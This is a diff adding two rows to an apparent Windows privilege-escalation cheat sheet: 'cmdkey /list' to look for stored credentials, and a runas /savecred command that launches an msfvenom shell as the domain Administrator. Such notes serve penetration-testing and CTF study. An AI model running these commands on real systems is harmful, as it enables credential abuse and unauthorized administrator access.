@@ -6,6 +6,8 @@
 | ```dir <name of file> /s /p``` | Search the file system, recursively for the filename |
 | ```whoami /priv``` | Gets the privileges for current user context |
 | ```more < name_of_alternate_data_stream.txt``` | Returns the contents of the alternate data stream | 
+| ```cmdkey /list``` | We may get lucky and find stored credentials |
+| ```runas /savecred /user:DOM.LOCAL\Administrator "C:\Users\<user>\Documents\shell.exe"``` | If the user is storing creds, launch an msfvenom shell | 
 
 | Check | Description |
 | --------- | ---------------------------- |
